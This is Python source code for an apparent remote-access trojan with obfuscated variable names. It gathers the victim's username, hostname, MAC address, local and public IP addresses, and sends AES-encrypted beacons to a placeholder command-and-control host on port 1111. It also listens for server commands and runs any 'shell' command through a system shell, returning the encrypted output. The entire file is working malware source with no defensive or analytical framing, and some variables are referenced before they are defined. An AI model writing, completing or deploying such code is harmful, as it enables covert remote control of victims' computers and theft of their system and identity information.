import sys
import socket
import subprocess
import os
import hashlib
import time
import base64
import string
import getpass
import codecs
import uuid
from Cryptodome.Cipher import AES
from Cryptodome import Random
from threading import Thread
from time import gmtime, strftime
from uuid import getnode as get_mac
var001 = 16
var002 = lambda s: s + (var001 - len(s) % var001) * chr(var001 - len(s) % var001)
var003 = "IP_SERVER_ADRESS"
def var006(msg,var042):
  msg = var002(msg)
  var004 = Random.new().read(AES.block_size)
  var005 = AES.new(var042, AES.MODE_OFB, var004)
  msg = base64.b64encode(var004 + var005.encrypt(msg.encode("utf-8")))
  return msg
class var007(Thread):
    def __init__(self):
        Thread.__init__(self)
    def run(self):
        if sys.version_info[0] == 3:
            from urllib.request import urlopen
        else:
            from urllib import urlopen
        var008 = uuid.UUID(int=uuid.getnode())
        var010 = os.name
        var011 = socket.gethostname()
        var012 = socket.gethostbyname(socket.gethostname())
        var013 = getpass.getuser()
        var014 = str(get_mac())
        with urlopen("http://icanhazip.com/") as url:
            s = url.read()
            var016 = str(s)
            var016 = var016.replace("b'", "")[:-3]
        var017 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        var017.connect((var003, 1111))
        var021 = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
        var023 = "Init:" + var021 + "," + str(var008) + "," + var014
        var017.send(var023.encode())
        var017.close()
        while True:
            var018 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            var018.connect((var003, 1111))
            time.sleep(10)
            var022 = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
            var024 = "Alive:" + var022 + "," + str(var008) + "," + var010 + "," + var011 + "," + var012 + "," + var013 + "," + var016
            var025 = var006(var024, var042)
            var025 = str(var014) + str(var025).replace("b'","")
            var018.send(var025.encode())
            print("[DEBUG] I'm Alive and seems connected to the C2 server.")
class var026(Thread):
    def __init__(self):
        Thread.__init__(self)
    def run(self):
        var019 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        var019.bind(('', 1111))
        var020 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        var020.connect((var003, 1111))
        while True:
            var019.listen(5)
            var027, var028 = var019.accept()
            if str(var028[0]) == var003:
                pass
            else:
                print("[WARNING] A wrong server is trying to talk with us, abording mission NOW !!!")
                exit(0)
            var029 = var027.recv(2048)
            if "shell" in str(var029).replace("b'", "")[:-1]:
                var030 = str(var029[6:]).replace("b'", "")[:-1]
                if ("Exit" in var030):
                    pass
                else:
                    print("[+] Server request this information : " + var030)
                    var020 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    var020.connect((var003, 1111))
                    var031 = subprocess.Popen(var030, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    var032 = var031.stdout.read() + var031.stderr.read()
                    var033 = var032
                    var034 = str('CMD:').encode() + var033
                    var035 = var006(str(var034), var042)
                    var035 = str(var015) + str(var035).replace("b'","")[:-1]
                    var020.send(var035.encode())
                    print("[+] result : " + str(var033))
                    var020.close()
            elif "upload" in str(var029):
                var036 = (str(var029).split(" ")[1][:-1])
                print("[+] Server want me to download : " + var036)
            else:
                print("[-] Server request something that i can't handle now. Update me !" + str(var029))
def var037(var015):
    var038 = ''
    for var039 in var015:
        var038 += str(string.ascii_lowercase[int(var039)])
    var040 = codecs.encode(var038, 'rot-13')
    return var040
var009 = uuid.UUID(int=uuid.getnode())
var015 = str(get_mac())
var041 = str(base64.b64encode(str(var009).encode("utf-8"))).replace("b'","")[:-1]
var038 = str(var037(var015))
var042 = str(var041) + str(var038)
print("[DEBUG] My custom AES encryption key is : " + str(var042))
var043 = bytes(var042.encode())
var042 = hashlib.sha256(var043).digest()
var044 = var007()
var045 = var026()
var044.start()
var045.start()
